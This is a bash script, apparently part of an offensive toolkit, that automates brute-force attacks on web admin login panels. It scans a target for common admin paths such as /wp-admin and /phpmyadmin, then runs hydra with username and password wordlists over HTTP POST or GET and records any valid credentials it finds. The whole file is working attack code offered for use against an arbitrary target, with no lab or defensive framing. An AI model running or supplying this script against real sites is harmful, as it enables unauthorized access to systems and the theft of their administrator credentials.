#!/bin/bash

# Web Admin Attack Script
# Automated web admin panel brute-force

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source logger
source "$SCRIPT_DIR/logger.sh"

# Default configuration
THREADS=16
TARGET=""
PORT=80
LOGIN_PATH="/admin"
METHOD="POST"
FAILURE_STRING="incorrect|failed|invalid|wrong"

# Common admin panel paths
COMMON_PATHS=(
    "/admin"
    "/login"
    "/admin/login"
    "/administrator"
    "/wp-admin"
    "/wp-login.php"
    "/phpmyadmin"
    "/cpanel"
    "/webmail"
    "/admin.php"
    "/login.php"
)

# Function to display help
show_help() {
    print_banner "Web Admin Attack Script"
    echo ""
    echo "Usage: $0 -t TARGET [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -t, --target      Target URL or IP address"
    echo ""
    echo "Optional:"
    echo "  -p, --port        Web port (default: 80)"
    echo "  -P, --path        Login path (default: /admin)"
    echo "  -m, --method      HTTP method: GET or POST (default: POST)"
    echo "  -u, --user-list   Custom username list file"
    echo "  -w, --word-list   Custom password wordlist file"
    echo "  -T, --threads     Number of parallel threads (default: 16)"
    echo "  -f, --fail-string Failure detection string (default: 'incorrect|failed|invalid')"
    echo "  -s, --ssl         Use HTTPS"
    echo "  -v, --verbose     Verbose output"
    echo "  -h, --help        Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 -t 192.168.1.100"
    echo "  $0 -t example.com -P /wp-login.php -s"
    echo "  $0 -t admin.example.com -m POST -f 'Login failed'"
    echo ""
}

# Function to validate input
validate_input() {
    if [ -z "$TARGET" ]; then
        log_error "Target is required"
        show_help
        exit 1
    fi
    
    if ! command -v hydra &> /dev/null; then
        log_error "Hydra is not installed. Please run install.sh first"
        exit 1
    fi
}

# Function to detect admin panel
detect_admin_panel() {
    log_info "Scanning for admin panels..."
    
    for path in "${COMMON_PATHS[@]}"; do
        local url="${PROTOCOL}://${TARGET}:${PORT}${path}"
        local status=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$url" 2>/dev/null)
        
        if [ "$status" = "200" ] || [ "$status" = "401" ] || [ "$status" = "403" ]; then
            log_success "Found admin panel: $path (HTTP $status)"
            LOGIN_PATH="$path"
            return 0
        fi
    done
    
    log_warning "No admin panel detected, using default: $LOGIN_PATH"
    return 1
}

# Function to run web attack
run_attack() {
    local username_file=$(mktemp)
    
    # Get usernames
    if [ -n "$CUSTOM_USERLIST" ] && [ -f "$CUSTOM_USERLIST" ]; then
        cat "$CUSTOM_USERLIST" > "$username_file"
    elif [ -f "$PROJECT_ROOT/config/admin_usernames.txt" ]; then
        cat "$PROJECT_ROOT/config/admin_usernames.txt" > "$username_file"
    else
        echo -e "admin\nadministrator\nroot" > "$username_file"
    fi
    
    # Get password wordlist
    local wordlist=""
    if [ -n "$CUSTOM_WORDLIST" ] && [ -f "$CUSTOM_WORDLIST" ]; then
        wordlist="$CUSTOM_WORDLIST"
    elif [ -f "$PROJECT_ROOT/config/admin_passwords.txt" ]; then
        wordlist="$PROJECT_ROOT/config/admin_passwords.txt"
    else
        log_error "No password wordlist found"
        rm -f "$username_file"
        exit 1
    fi
    
    print_header "Starting Web Attack"
    log_info "Target: ${PROTOCOL}://${TARGET}:${PORT}${LOGIN_PATH}"
    log_info "Method: $METHOD"
    log_info "Threads: $THREADS"
    echo ""
    
    # Determine form parameters (common variations)
    local form_params="username=^USER^&password=^PASS^"
    
    # Run hydra for HTTP POST
    if [ "$METHOD" = "POST" ]; then
        local service="http-post-form"
        [ "$USE_SSL" = "true" ] && service="https-post-form"
        
        hydra -L "$username_file" -P "$wordlist" \
              -t $THREADS \
              -f \
              $TARGET \
              $service "$LOGIN_PATH:$form_params:$FAILURE_STRING" 2>&1 | while IFS= read -r line; do
            
            if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
                local login=$(echo "$line" | grep -oP 'login: \K[^ ]+')
                local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
                
                save_result "http" "$TARGET" "$login" "$password" "$PORT"
                log_success "Valid credentials found: $login:$password"
                
                rm -f "$username_file"
                return 0
            fi
            
            [ "$VERBOSE" = "true" ] && echo "$line"
        done
    else
        # HTTP GET
        local service="http-get"
        [ "$USE_SSL" = "true" ] && service="https-get"
        
        hydra -L "$username_file" -P "$wordlist" \
              -t $THREADS \
              -f \
              $TARGET \
              $service "$LOGIN_PATH" 2>&1 | while IFS= read -r line; do
            
            if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
                local login=$(echo "$line" | grep -oP 'login: \K[^ ]+')
                local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
                
                save_result "http" "$TARGET" "$login" "$password" "$PORT"
                log_success "Valid credentials found: $login:$password"
                
                rm -f "$username_file"
                return 0
            fi
            
            [ "$VERBOSE" = "true" ] && echo "$line"
        done
    fi
    
    local result=$?
    rm -f "$username_file"
    
    if [ $result -ne 0 ]; then
        log_warning "No valid credentials found"
    fi
    
    return $result
}

# Parse command line arguments
CUSTOM_WORDLIST=""
CUSTOM_USERLIST=""
VERBOSE=false
USE_SSL=false
PROTOCOL="http"

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -P|--path)
            LOGIN_PATH="$2"
            shift 2
            ;;
        -m|--method)
            METHOD="$2"
            shift 2
            ;;
        -u|--user-list)
            CUSTOM_USERLIST="$2"
            shift 2
            ;;
        -w|--word-list)
            CUSTOM_WORDLIST="$2"
            shift 2
            ;;
        -T|--threads)
            THREADS="$2"
            shift 2
            ;;
        -f|--fail-string)
            FAILURE_STRING="$2"
            shift 2
            ;;
        -s|--ssl)
            USE_SSL=true
            PROTOCOL="https"
            PORT=443
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution
print_banner "Web Admin Attack"
echo ""

validate_input

# Try to detect admin panel
detect_admin_panel

# Run the attack
run_attack
exit_code=$?

rotate_logs
exit $exit_code
